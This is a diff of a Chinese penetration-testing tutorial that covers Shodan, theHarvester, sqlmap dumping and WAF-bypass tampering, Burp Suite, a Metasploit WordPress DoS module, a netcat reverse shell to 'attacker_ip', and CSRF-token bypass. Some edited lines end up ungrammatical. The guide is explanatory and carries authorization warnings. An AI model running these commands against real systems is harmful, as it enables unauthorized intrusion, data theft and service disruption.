@@ -75,7 +75,7 @@ Shodan: 互联网搜索引擎，用于查找各种在线设备。
 
 > 基础搜索
 
-在搜索框中输入你想搜索的关键字，例如“webcam”。
+在搜索框中输入想搜索的关键字，例如“webcam”。
 按下Enter键，Shodan会列出与关键字相关的设备。
 
 > 使用过滤器
@@ -86,7 +86,7 @@ port:21：只显示开放了21端口（FTP）的设备。
 os:Windows：只显示运行Windows操作系统的设备。
 
 使用Shodan API
-Shodan还提供了API，允许你在自己的应用程序中进行搜索。你需要从Shodan网站获取API密钥。
+Shodan还提供了API，允许在自己的应用程序中进行搜索。需要从Shodan网站获取API密钥。
 
 以下是一个使用Python和Shodan API进行搜索的简单示例：
 
@@ -117,7 +117,7 @@ theHarvester 是一款用于收集电子邮件地址、子域名、主机、开�
 
 > 安装
 
-首先，你需要安装 theHarvester。如果你使用的是 Kali Linux，该工具可能已经预安装了。如果没有，你可以通过以下命令进行安装：
+首先，需要安装 theHarvester。如果使用的是 Kali Linux，该工具可能已经预安装了。如果没有，可以通过以下命令进行安装：
 
 ```bash
 git clone https://github.com/laramies/theHarvester.git
@@ -141,7 +141,7 @@ python3 theHarvester.py -d example.com -b google
 python3 theHarvester.py -d example.com -b bing
 ```
 使用多个数据源
-你还可以使用多个数据源来进行更全面的信息收集。例如：
+还可以使用多个数据源来进行更全面的信息收集。例如：
 
 ```bash
 python3 theHarvester.py -d example.com -b google,bing,linkedin
@@ -167,7 +167,7 @@ MacOS 安装
 brew install sqlmap
 ```
 Linux 安装 SQLmap
-如果你使用的是 Kali Linux，SQLmap 可能已经预安装了。如果没有，你可以通过以下命令进行安装：
+如果使用的是 Kali Linux，SQLmap 可能已经预安装了。如果没有，可以通过以下命令进行安装：
 
 ```bash
 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
@@ -176,24 +176,24 @@ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 > 基础用法
 
 测试 GET 参数
-假设你有一个目标 URL，它的 id 参数可能存在 SQL 注入漏洞：
+假设有一个目标 URL，它的 id 参数可能存在 SQL 注入漏洞：
 
 ```bash
 http://example.com/page.php?id=1
 ```
-你可以使用以下命令来测试这个参数：
+可以使用以下命令来测试这个参数：
 
 ```bash
 python sqlmap.py -u "http://example.com/page.php?id=1"
 ```
 测试 POST 参数
-如果目标使用 POST 方法提交数据，你可以使用 -data 参数：
+如果目标使用 POST 方法提交数据，可以使用 -data 参数：
 
 ```bash
 python sqlmap.py -u "http://example.com/page.php" --data="id=1"
 ```
 使用 Cookie
-如果需要，你还可以添加 Cookie 数据：
+如果需要，还可以添加 Cookie 数据：
 
 ```bash
 python sqlmap.py -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abc123"
@@ -217,10 +217,10 @@ python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name -T table
 python sqlmap.py -u "http://example.com/page.php?id=1" -D database_name -T table_name -C column1,column2 --dump
 ```
 高级用法
-SQLmap 还有很多高级选项，如使用代理、绕过 WAF、进行延时测试等。你可以通过运行 python sqlmap.py -h 来查看所有可用选项。
+SQLmap 还有很多高级选项，如使用代理、绕过 WAF、进行延时测试等。可以通过运行 python sqlmap.py -h 来查看所有可用选项。
 
 使用代理
-要通过代理服务器运行 sqlmap，你可以使用 --proxy 参数：
+要通过代理服务器运行 sqlmap，可以使用 --proxy 参数：
 
 ```bash
 sqlmap -u "http://target.com/vuln.php?id=1" --proxy="http://127.0.0.1:8080"
@@ -236,7 +236,7 @@ sqlmap -u "http://target.com/vuln.php?id=1" --tamper="between,randomcase,space2c
 这里，between、randomcase 和 space2comment 是 tamper 脚本，用于修改 SQL 语句以绕过 WAF。
 
 进行延时测试
-如果你想控制请求之间的时间延迟，可以使用 --delay 和 --timeout 参数：
+如果想控制请求之间的时间延迟，可以使用 --delay 和 --timeout 参数：
 ```bash
 sqlmap -u "http://target.com/vuln.php?id=1" --delay=0.5 --timeout=30
 ```
@@ -255,23 +255,23 @@ Burp Suite: Web应用安全测试工具。
 > 设置代理
 打开 Burp Suite，转到 "Proxy" -> "Options"。
 确保代理监听器处于活动状态，默认监听地址通常是 127.0.0.1:8080。
-在你的 Web 浏览器中，设置 HTTP 代理为 Burp Suite 的监听地址。
+在的 Web 浏览器中，设置 HTTP 代理为 Burp Suite 的监听地址。
 
 > 拦截请求
 在 Burp Suite 中，转到 "Proxy" -> "Intercept"。
 确保 "Intercept is on" 已经启用。
-在浏览器中访问一个网站，你应该能在 Burp Suite 中看到拦截到的 HTTP 请求。
+在浏览器中访问一个网站，应该能在 Burp Suite 中看到拦截到的 HTTP 请求。
 
 > 爬虫和扫描
 在拦截到的请求上右键，选择 "Send to Spider" 或 "Send to Scanner"。
-如果选择了 "Spider"，转到 "Target" -> "Site map"，你会看到爬虫开始收集的 URL。
-如果选择了 "Scanner"，转到 "Dashboard"，你会看到扫描的进度和结果。
+如果选择了 "Spider"，转到 "Target" -> "Site map"，会看到爬虫开始收集的 URL。
+如果选择了 "Scanner"，转到 "Dashboard"，会看到扫描的进度和结果。
 
 > 其他功能
 "Repeater" 可用于手动修改和重新发送 HTTP 请求。
 "Decoder" 可用于解码和编码各种数据格式。
 "Comparer" 可用于比较两个或多个数据集。
-注意：未经授权的渗透测试是非法的。确保你有明确的授权来使用这些工具和技术。
+注意：未经授权的渗透测试是非法的。确保有明确的授权来使用这些工具和技术。
 
 
 ## 操作系统和网络层测试
@@ -343,16 +343,16 @@ exploit/multi/http/wp_plugin_sp_project_document_rce 是一个 exploit 类型的
 
 auxiliary/scanner/http/wordpress_xmlrpc_login 是一个 auxiliary 类型的模块，用于扫描 WordPress 站点以查找有效的 XML-RPC 登录凭据。它不需要身份验证（No）。
 
-这些模块通常用于渗透测试或安全研究，但也可能被用于非法活动。因此，在使用这些模块之前，请确保你有适当的授权和合法的目的。
+这些模块通常用于渗透测试或安全研究，但也可能被用于非法活动。因此，在使用这些模块之前，请确保有适当的授权和合法的目的。
 
 
 基础使用
-搜索模块：在 Metasploit 控制台中，你可以使用 search 命令来查找特定的漏洞或模块。
+搜索模块：在 Metasploit 控制台中，可以使用 search 命令来查找特定的漏洞或模块。
 
 ```bash
 search wordpress
 ```
-选择模块：找到你想使用的模块后，使用 use 命令来选择它。
+选择模块：找到想使用的模块后，使用 use 命令来选择它。
 
 ```bash
 use auxiliary/dos/http/wordpress_xmlrpc_dos 
@@ -364,7 +364,7 @@ show options
 ```
 设置参数：使用 set 命令来设置参数。
 
-设置目标主机（RHOSTS）: 这是你想要攻击的目标服务器的 IP 地址或域名。
+设置目标主机（RHOSTS）: 这是想要攻击的目标服务器的 IP 地址或域名。
 
 ```bash
 set RHOSTS target.com
@@ -379,7 +379,7 @@ set RPORT 8080
 ```bash
 set RLIMIT 1000
 ```
-设置目标 URI（TARGETURI）: 如果 WordPress 安装在子目录中，你需要设置这个。
+设置目标 URI（TARGETURI）: 如果 WordPress 安装在子目录中，需要设置这个。
 
 ```bash
 set TARGETURI /wordpress/
@@ -389,7 +389,7 @@ set TARGETURI /wordpress/
 ```bash
 set SSL true
 ```
-设置代理（Proxies）: 如果你想通过代理进行攻击，可以设置这个选项。
+设置代理（Proxies）: 如果想通过代理进行攻击，可以设置这个选项。
 
 ```bash
 set Proxies http:127.0.0.1:8080
@@ -399,7 +399,7 @@ set Proxies http:127.0.0.1:8080
 ```bash
 set VHOST virtualhost.com
 ```
-运行攻击: 一旦所有设置都完成，你可以运行攻击。
+运行攻击: 一旦所有设置都完成，可以运行攻击。
 
 ```bash
 run
@@ -415,9 +415,9 @@ set PASSWORD password123
 ```bash
 exploit
 ```
-有效载荷（Payloads）：某些模块允许你设置不同类型的有效载荷。你可以使用 show payloads 查看可用的有效载荷，并用 set PAYLOAD 来设置。
+有效载荷（Payloads）：某些模块允许设置不同类型的有效载荷。可以使用 show payloads 查看可用的有效载荷，并用 set PAYLOAD 来设置。
 
-获取会话（Sessions）：成功的攻击通常会创建一个会话，你可以用 sessions 命令查看它们。
+获取会话（Sessions）：成功的攻击通常会创建一个会话，可以用 sessions 命令查看它们。
 
 ```bash
 sessions -l
@@ -450,7 +450,7 @@ nc -l 1234
 ```bash
 nc localhost 1234
 ```
-现在，你可以在客户端终端中输入文本，并在服务器终端中看到相同的文本。
+现在，可以在客户端终端中输入文本，并在服务器终端中看到相同的文本。
 
 文件传输
 
@@ -465,7 +465,7 @@ nc localhost 1234 < send_file.txt
 ```
 
 端口扫描
-你可以使用 Netcat 执行基础的端口扫描。
+可以使用 Netcat 执行基础的端口扫描。
 
 ```bash
 nc -zv localhost 20-80
@@ -488,7 +488,7 @@ nc attacker_ip 1234 -e /bin/bash
 
 目标机器: 这是攻击者试图访问或控制的计算机。在给出的例子中，nc attacker_ip 1234 -e /bin/bash 是在目标机器上运行的。这个命令会连接到攻击者机器，并执行 /bin/bash，从而允许攻击者通过网络执行 shell 命令。
 
-简单来说，如果你是目标（被攻击者），你不会在自己的机器上运行 nc attacker_ip 1234 -e /bin/bash，因为这样做会给攻击者提供对你机器的控制权。相反，攻击者会尝试某种方式让你的机器执行这个命令，以便他们能够控制你的机器。
+简单来说，如果是目标（被攻击者），不会在自己的机器上运行 nc attacker_ip 1234 -e /bin/bash，因为这样做会给攻击者提供对机器的控制权。相反，攻击者会尝试某种方式让的机器执行这个命令，以便他们能够控制的机器。
 
 
 
@@ -646,11 +646,11 @@ CSRF 令牌是 MD5 或 Base64 编码值。可以解码该值并在该算法中�
 假设一个应用程序使用 MD5 算法和一个固定的值（比如 "122"）来生成 CSRF 令牌。这样，MD5("122") 就会生成一个特定的 CSRF 令牌，比如 "a0a080f42e6f13b3a2df133f073095dd"。
 
 攻击步骤：
-识别算法：首先，你需要识别出应用程序是如何生成 CSRF 令牌的。这可能需要一些逆向工程或代码审计。
+识别算法：首先，需要识别出应用程序是如何生成 CSRF 令牌的。这可能需要一些逆向工程或代码审计。
 
-生成新令牌：一旦你知道了算法和用于生成令牌的值（在这个例子中是 "122" 和 MD5 算法），你就可以生成一个新的令牌。比如，使用 "123" 作为新的值，然后计算 MD5("123")。
+生成新令牌：一旦知道了算法和用于生成令牌的值（在这个例子中是 "122" 和 MD5 算法），就可以生成一个新的令牌。比如，使用 "123" 作为新的值，然后计算 MD5("123")。
 
-替换令牌：最后，你可以在发送到服务器的请求中使用这个新生成的 CSRF 令牌，从而绕过 CSRF 保护。
+替换令牌：最后，可以在发送到服务器的请求中使用这个新生成的 CSRF 令牌，从而绕过 CSRF 保护。
 
 如果应用程序没有其他额外的安全检查，这种方法就有可能成功。
 
@@ -690,15 +690,15 @@ CSRF token由两部分组成。静态部件和动态部件。
 这种情况下，如果应用程序在验证 CSRF 令牌时只检查静态部分（即 "shahmeer7424"），那么攻击者可以只使用这一部分来绕过 CSRF 保护。
 
 如何进行攻击：
-识别静态和动态部分：首先，你需要确定令牌中哪一部分是静态的，哪一部分是动态的。
+识别静态和动态部分：首先，需要确定令牌中哪一部分是静态的，哪一部分是动态的。
 
-构造新令牌：然后，你可以使用静态部分构造一个新的 "有效" 令牌。在这个例子中，你可以使用 "shahmeer7424" 加上任意的动态部分。
+构造新令牌：然后，可以使用静态部分构造一个新的 "有效" 令牌。在这个例子中，可以使用 "shahmeer7424" 加上任意的动态部分。
 
 替换令牌：最后，在发送到服务器的请求中使用这个新构造的令牌。
 
 如果应用程序只检查令牌的静态部分，那么这种攻击就有可能成功。
 
 注意：
-这种方法需要你能够识别出 CSRF 令牌的静态和动态部分，这可能需要一些逆向工程或代码审计。
+这种方法需要能够识别出 CSRF 令牌的静态和动态部分，这可能需要一些逆向工程或代码审计。
 
 这种方法也假设应用程序的 CSRF 令牌验证机制存在缺陷。
